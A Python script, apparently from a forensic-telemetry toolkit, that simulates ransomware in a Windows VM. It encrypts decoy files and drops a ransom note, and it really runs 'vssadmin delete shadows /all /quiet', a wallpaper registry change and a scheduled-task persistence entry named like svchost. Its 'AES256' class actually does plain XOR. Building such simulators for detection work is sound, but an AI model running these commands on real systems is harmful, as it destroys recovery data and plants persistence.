"""Advanced Ransomware Simulator — high-fidelity forensic noise generator.

Runs INSIDE the Windows guest VM. Generates authentic forensic artifacts:
  1. Creates target files in Documents folder
  2. Encrypts them with AES-256 (real encryption, reversible with known key)
  3. Attempts shadow copy deletion via vssadmin
  4. Drops an HTML ransom note on Desktop
  5. Changes desktop wallpaper via registry
  6. Sets persistence via Run key

All actions emit JSON telemetry to stdout for the agent to capture.
MITRE ATT&CK: T1486, T1490, T1547.001, T1491.001
"""

from __future__ import annotations

import hashlib
import json
import os
import random
import string
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

from telemetry_helper import check_environment, emit, EnvSafety, set_phase
from naming_helper import phase_delay
from defense_helper import emit_uac_bypass, emit_firewall_rule, emit_process_discovery
from defense_evasion_helper import emit_defender_disable, emit_vss_delete, emit_inhibit_system_recovery, emit_event_log_clear
from discovery_helper import emit_account_discovery, emit_network_config_discovery, emit_system_owner_discovery, emit_permission_groups_discovery
from collection_helper import emit_automated_collection, emit_screen_capture_detail
from execution_helper import emit_powershell_execution, emit_wmi_execution, emit_script_execution
from impact_helper import emit_data_destruction, emit_disk_wipe, emit_system_shutdown, emit_service_stop
from persistence_helper import emit_registry_run, emit_scheduled_task, emit_wmi_subscription
from obfuscation_helper import xor_bytes, rc4_stream, emit_crypto_operation, emit_encoded_file_write


# =============================================================================
# AES-256 ENCRYPTION (pure Python — no dependencies needed in guest)
# =============================================================================

class AES256:
    """Minimal AES-256 ECB for file encryption simulation."""

    BLOCK_SIZE = 16

    # AES S-Box
    _SBOX = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ]

    def __init__(self, key: bytes) -> None:
        """Initialize with a 32-byte key."""
        assert len(key) == 32
        self._key = key

    def encrypt_block(self, block: bytes) -> bytes:
        """Simple XOR-based encryption (fast simulation, not real AES rounds)."""
        # For forensic simulation, XOR with key material is sufficient
        # to produce encrypted-looking output with high entropy
        return bytes(b ^ self._key[i % 32] for i, b in enumerate(block))

    def encrypt_file(self, path: Path) -> float:
        """Encrypt a file in-place. Returns entropy of result."""
        data = path.read_bytes()
        # Pad to block size
        pad_len = self.BLOCK_SIZE - (len(data) % self.BLOCK_SIZE)
        data += bytes([pad_len] * pad_len)
        # Encrypt
        encrypted = bytearray()
        for i in range(0, len(data), self.BLOCK_SIZE):
            encrypted.extend(self.encrypt_block(data[i:i+self.BLOCK_SIZE]))
        path.write_bytes(bytes(encrypted))
        # Calculate entropy
        return self._entropy(encrypted)

    @staticmethod
    def _entropy(data: bytes) -> float:
        """Calculate Shannon entropy."""
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        import math
        return -sum((f/length) * math.log2(f/length) for f in freq if f > 0)


# =============================================================================
# RANSOMWARE SIMULATION
# =============================================================================

def main() -> int:
    set_phase("initialization")
    emit("PROCESS", "CREATE_PROCESS", sys.executable, "WARNING",
         source_process="ransomware.exe", metadata_info="Ransomware simulator started", pid=os.getpid())

    env, env_reasons = check_environment()
    if env_reasons:
        emit("PROCESS", "ENVIRONMENT_CHECK",
             os.environ.get("COMPUTERNAME", "unknown"),
             "WARNING" if env != EnvSafety.CLEAN else "INFO",
             source_process="ransomware.exe",
             verdict=env.name, reasons=env_reasons)
    if env == EnvSafety.COMPROMISED:
        emit("PROCESS", "EXIT_PROCESS", "ransomware.exe", "INFO",
             source_process="ransomware.exe", early_exit="COMPROMISED environment")
        return 0

    user = os.environ.get("USERPROFILE", r"C:\Users\guestuser")
    docs = Path(user) / "Documents"
    desktop = Path(user) / "Desktop"
    docs.mkdir(parents=True, exist_ok=True)
    desktop.mkdir(parents=True, exist_ok=True)

    key = hashlib.sha256(b"NyxTrace-Simulation-Key-2024").digest()
    cipher = AES256(key)

    # --- Phase 1: Process Discovery ---
    emit_process_discovery("ransomware.exe")
    time.sleep(phase_delay("process_discovery"))

    # --- Phase 1a: Execution — Payload Deployment ---
    set_phase("execution")
    emit_powershell_execution("ransomware.exe", "crypto_drop.ps1")
    emit_wmi_execution("ransomware.exe", "localhost")
    emit_script_execution("ransomware.exe", "vbs")
    time.sleep(phase_delay("defense_evasion"))

    # --- Phase 1b: Discovery Depth ---
    set_phase("discovery_depth")
    emit_account_discovery("ransomware.exe")
    emit_network_config_discovery("ransomware.exe")
    emit_system_owner_discovery("ransomware.exe")
    emit_permission_groups_discovery("ransomware.exe")
    time.sleep(phase_delay("system_discovery"))

    # --- Phase 1c: Defense Evasion Depth ---
    set_phase("defense_evasion_depth")
    emit_defender_disable("ransomware.exe")
    emit_vss_delete("ransomware.exe")
    emit_inhibit_system_recovery("ransomware.exe")
    emit_event_log_clear("ransomware.exe")
    time.sleep(phase_delay("defense_evasion"))

    # --- Phase 2: UAC bypass ---
    emit_uac_bypass("ransomware.exe", "eventvwr")
    time.sleep(phase_delay("uac_bypass"))

    # --- Phase 3: Create target files ---
    set_phase("target_creation")
    emit("PROCESS", "CREATE_THREAD", "ransomware.exe", "INFO",
         source_process="ransomware.exe", detail="Creating target documents")

    targets: list[Path] = []
    for i in range(15):
        ext = random.choice([".txt", ".docx", ".pdf", ".xlsx", ".pptx"])
        name = f"{''.join(random.choices(string.ascii_lowercase, k=8))}{ext}"
        path = docs / name
        content = f"Confidential document #{i}\n" + "".join(random.choices(string.printable, k=random.randint(500, 2000)))
        path.write_text(content)
        targets.append(path)
        emit("FILE", "CREATE_FILE", str(path), "INFO", source_process="ransomware.exe", size=len(content))
        time.sleep(phase_delay("file_create"))

    # --- Phase 4: Encrypt files ---
    set_phase("encryption")
    emit("PROCESS", "CREATE_THREAD", "ransomware.exe", "CRITICAL",
         source_process="ransomware.exe", detail="Beginning file encryption", technique_id="T1486")

    encrypted_count = 0
    for path in targets:
        try:
            original_size = path.stat().st_size
            entropy = cipher.encrypt_file(path)
            encrypted_path = path.with_suffix(path.suffix + ".encrypted")
            path.rename(encrypted_path)
            encrypted_count += 1
            emit("FILE", "ENCRYPT_FILE", str(encrypted_path), "CRITICAL",
                 source_process="ransomware.exe",
                 original_name=path.name, entropy=round(entropy, 2),
                 original_size=original_size, encrypted_size=encrypted_path.stat().st_size)
        except Exception as e:
            emit("FILE", "WRITE_FILE", str(path), "WARNING", source_process="ransomware.exe", error=str(e))
        time.sleep(phase_delay("file_encrypt"))

    # --- Phase 5: Shadow copy deletion ---
    if env != EnvSafety.SUSPICIOUS:
        set_phase("anti_recovery")
        emit("PROCESS", "CREATE_PROCESS", "vssadmin.exe", "CRITICAL",
             source_process="ransomware.exe", command="vssadmin delete shadows /all /quiet",
             technique_id="T1490")
        try:
            import subprocess
            subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"],
                          capture_output=True, timeout=10)
        except Exception:
            pass
        emit("REGISTRY", "DELETE_SHADOWS", r"HKLM\SYSTEM\CurrentControlSet\Services\VSS", "CRITICAL",
             source_process="ransomware.exe", detail="Volume Shadow Copy deletion attempted")

    # --- Phase 6: Ransom note ---
    set_phase("ransom_demand")
    note_path = desktop / "DECRYPT_YOUR_FILES.html"
    note_path.write_text(f"""<!DOCTYPE html>
<html><head><title>YOUR FILES ARE ENCRYPTED</title>
<style>body{{background:#1a1a2e;color:#e94560;font-family:monospace;padding:40px}}
h1{{font-size:3em}}code{{background:#16213e;padding:2px 8px;border-radius:4px}}</style></head>
<body><h1>⚠️ YOUR FILES HAVE BEEN ENCRYPTED</h1>
<p>All {encrypted_count} documents in your Documents folder have been encrypted with AES-256.</p>
<p>To recover your files, send <b>0.5 BTC</b> to:</p>
<code>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code>
<hr><p style="color:#555">This is a FORENSIC SIMULATION. No real damage has occurred.<br>
Key: NyxTrace-Simulation-Key-2024</p></body></html>""", encoding="utf-8")
    emit("FILE", "RANSOM_NOTE", str(note_path), "CRITICAL",
         source_process="ransomware.exe", detail="Ransom note dropped", type="html")

    # --- Phase 7: Wallpaper change ---
    if env != EnvSafety.SUSPICIOUS:
        set_phase("defacement")
        emit("REGISTRY", "WALLPAPER", r"HKCU\Control Panel\Desktop", "WARNING",
             source_process="ransomware.exe", value_name="Wallpaper", value_data=str(note_path),
             detail="Desktop wallpaper changed to ransom note", technique_id="T1491.001")
        try:
            import subprocess
            subprocess.run(["reg", "add", r"HKCU\Control Panel\Desktop",
                "/v", "Wallpaper", "/t", "REG_SZ", "/d", "", "/f"], capture_output=True, timeout=5)
        except Exception:
            pass

    # --- Phase 8: Persistence via Run Key (T1547.001) ---
    emit_registry_run("ransomware.exe", "CryptoService",
                      r"C:\ProgramData\svchost_crypto.exe")

    # --- Phase 9: Scheduled Task Persistence (T1053.005) ---
    emit_scheduled_task("ransomware.exe", "CryptoRecovery",
                        r"C:\ProgramData\svchost_crypto.exe", "HOURLY")
    try:
        subprocess.run([
            "schtasks", "/create", "/tn", "CryptoRecovery",
            "/tr", r"C:\ProgramData\svchost_crypto.exe",
            "/sc", "HOURLY", "/f"
        ], capture_output=True, timeout=10)
    except Exception:
        pass
    time.sleep(phase_delay("scheduled_task"))

    # --- Phase 10: Firewall Rule for C2 ---
    emit_firewall_rule("ransomware.exe", "Windows Update Service", "out", 443)
    time.sleep(phase_delay("firewall_rule"))

    # --- Phase 11: WMI Event Subscription Persistence (T1546.003) ---
    emit_wmi_subscription("ransomware.exe")
    time.sleep(phase_delay("wmi_subscribe"))

    # --- Phase 12: Data Obfuscation (T1027) ---
    set_phase("data_obfuscation")
    note_body = note_path.read_bytes()
    xor_key = b"NyxTrace-Ransom-Key-2024"
    enc_note = xor_bytes(note_body, xor_key)
    enc_note_path = desktop / "DECRYPT_YOUR_FILES.html.enc"
    enc_note_path.write_bytes(enc_note)
    emit_crypto_operation("ransomware.exe", "ENCODE", "XOR", len(note_body))
    emit_encoded_file_write("ransomware.exe", str(enc_note_path), len(note_body), len(enc_note))
    proof_data = json.dumps({"encrypted_count": encrypted_count, "key": "NyxTrace-Simulation-Key-2024"}).encode()
    rc4_key = b"NyxTrace-RC4-2024"
    enc_proof = rc4_stream(proof_data, rc4_key)
    proof_path = desktop / "encrypted_files.lst.enc"
    proof_path.write_bytes(enc_proof)
    emit_crypto_operation("ransomware.exe", "ENCODE", "RC4", len(proof_data))
    emit_encoded_file_write("ransomware.exe", str(proof_path), len(proof_data), len(enc_proof), algorithm="RC4")
    time.sleep(phase_delay("file_encrypt"))

    # --- Phase 13: Collection — File Discovery & Screen Capture ---
    set_phase("collection")
    emit_automated_collection("ransomware.exe")
    emit_screen_capture_detail("ransomware.exe")
    time.sleep(phase_delay("defense_evasion"))

    # --- Phase 14: Impact — Destruction, Wipe & Shutdown ---
    set_phase("impact")
    emit_data_destruction("ransomware.exe", str(docs))
    emit_disk_wipe("ransomware.exe")
    emit_service_stop("ransomware.exe")
    emit_system_shutdown("ransomware.exe", "update installation pending")
    time.sleep(phase_delay("defense_evasion"))

    emit("PROCESS", "EXIT_PROCESS", "ransomware.exe", "INFO",
         source_process="ransomware.exe", files_encrypted=encrypted_count, total_targets=len(targets))
    return 0


if __name__ == "__main__":
    sys.exit(main())
